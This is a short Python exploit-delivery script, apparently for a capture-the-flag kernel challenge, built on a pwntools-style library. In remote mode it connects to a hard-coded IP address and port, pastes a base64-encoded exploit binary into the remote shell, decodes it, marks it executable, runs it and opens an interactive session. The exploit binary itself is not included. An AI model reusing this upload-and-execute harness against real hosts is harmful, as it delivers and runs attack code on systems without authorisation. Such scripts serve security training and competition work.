#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './run.sh'
context.arch = 'amd64'
context.log_level= 'INFO'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir

def exploit():
    os.system('bash pack.sh')

    if mode == 'debug':
        io = debug(binary)
        io.b([
        ])
        io.r()
    elif mode == 'remote':
        io = remote('202.120.7.195', 13134)

        io.sendlineafter('/ $ ', 'stty -echo')
        io.sendlineafter('/ $ ', 'cd /home/note')
        io.sendlineafter('$ ', 'cat << EOF > exp.b64')
        io.sendline(read('cpio/exp').encode('base64'))
        io.sendline('EOF')
        io.sendlineafter('$ ', 'base64 -d exp.b64 > exp')
        io.sendlineafter('$ ', 'chmod +x exp')
        io.sendlineafter('$ ', 'stty +echo')
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    io.sendlineafter('$ ', './exp')

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        #'''.strip().split('\n'))

    io.interactive()

if __name__ == '__main__':
    exploit()
